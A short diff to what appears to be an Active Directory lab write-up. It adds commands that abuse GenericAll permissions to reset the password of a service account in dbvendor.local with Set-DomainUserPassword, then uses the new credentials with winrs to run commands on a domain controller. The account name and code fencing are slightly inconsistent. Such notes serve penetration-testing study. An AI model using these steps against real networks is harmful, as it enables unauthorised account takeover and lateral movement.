@@ -565,7 +565,11 @@ IdentityReferenceClass  : user
 Reviewing the ACls it's possible with Generic all eprmissions Reset the Password of dbxsvc
 
 ```
-Set-DomainUserPassword -Identity dbxsvc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose
+Set-DomainUserPassword -Identity db17svc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local -Verbose```
 ```
 ## Privilege escalation
-
+```
+PS C:\Windows\system32> winrs -r:db-dc.db.local -u:dbvendor\db17svc -p:Password@123 "whoami"
+dbvendor\db17svc
+PS C:\Windows\system32> winrs -r:db-dc.db.local -u:dbvendor\db17svc -p:Password@123 "whoami;hostname;ipconfig"
+```
